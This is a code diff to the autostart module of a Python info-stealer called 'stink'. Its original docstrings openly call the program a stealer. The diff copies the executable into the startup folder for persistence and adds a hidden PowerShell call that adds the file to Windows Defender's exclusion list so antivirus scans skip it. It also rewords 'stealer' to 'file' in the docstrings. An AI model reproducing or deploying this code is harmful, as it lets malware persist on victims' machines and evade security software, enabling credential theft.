@@ -1,34 +1,23 @@
 from os import path
 from shutil import copyfile
+from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
 
 from stink.helpers.config import AutostartConfig
 
 
 class Autostart:
     """
-    Adds the stealer to autostart.
+    Adds the file to autostart.
     """
     def __init__(self, executor_path: str):
 
         self.__executor_path = executor_path
         self.__config = AutostartConfig()
-
-    def __create_copy(self) -> None:
-        """
-        Creates a copy of the stealer.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        self.executor_name = self.__executor_path.replace("\\", "/").split("/")[-1]
-        copyfile(self.__executor_path, path.join(self.__config.ExecutorPath, self.executor_name))
+        self.__autostart_path = path.join(self.__config.AutostartPath, f"{self.__config.AutostartName}.exe")
 
     def __add_to_autostart(self) -> None:
         """
-        Adds the stealer to autostart.
+        Creates a copy of the file.
 
         Parameters:
         - None.
@@ -36,10 +25,23 @@ class Autostart:
         Returns:
         - None.
         """
-        with open(rf"{self.__config.AutostartPath}\{self.__config.AutostartName}.bat", "w+") as file:
-            file.write(f'@echo off\nstart "{self.__config.AutostartName}" "{self.__config.ExecutorPath}\\{self.executor_name}"')
+        copyfile(self.__executor_path, self.__autostart_path)
 
-        file.close()
+    def __exclude_from_defender(self) -> None:
+        """
+        Trying to exclude a file from Windows Defender checks.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
+        """
+        Popen(
+            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__autostart_path}'",
+            shell=True,
+            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
+        )
 
     def run(self) -> None:
         """
@@ -53,8 +55,8 @@ class Autostart:
         """
         try:
 
-            self.__create_copy()
             self.__add_to_autostart()
+            self.__exclude_from_defender()
 
         except Exception as e:
             print(f"[Autostart]: {repr(e)}")
